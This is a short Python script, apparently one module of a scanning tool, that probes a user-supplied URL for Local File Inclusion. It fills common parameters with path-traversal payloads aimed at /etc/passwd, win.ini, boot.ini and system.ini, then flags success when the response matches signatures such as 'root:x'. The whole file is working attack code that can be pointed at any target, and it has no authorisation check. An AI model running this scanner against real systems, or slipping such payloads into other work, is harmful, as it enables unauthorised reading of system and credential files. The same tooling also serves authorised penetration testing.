import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore

def guess_params(params):
    if not params:
        common_params = ['file', 'page', 'template', 'include']
        params = {p: [''] for p in common_params}
    return params

def run():
    print("Running Local File Inclusion (LFI) scan with automatic parameter detection...")
    url = input("Enter target URL (with or without parameters): ").strip()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params = guess_params(params)

    payloads = [
        "../../../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "../../boot.ini",
        "..\\..\\boot.ini",
        "../../../windows/system.ini"
    ]

    vulnerable_params = []

    for param in params:
        vulnerable = False
        for payload in payloads:
            test_params = params.copy()
            test_params[param] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
            try:
                res = requests.get(test_url, timeout=5)
                content = res.text.lower()
                if "root:x" in content or "[extensions]" in content or "for 16-bit app support" in content:
                    print(Fore.RED + f"[!] LFI vulnerability detected in parameter: {param} with payload: {payload}")
                    vulnerable = True
                    vulnerable_params.append(param)
                    break
            except Exception as e:
                print(Fore.RED + f"[ERROR] {e}")
        if not vulnerable:
            print(Fore.YELLOW + f"[ ] No LFI detected in parameter: {param}")

    if not vulnerable_params:
        print(Fore.YELLOW + "[!] No vulnerable parameters detected for LFI.")
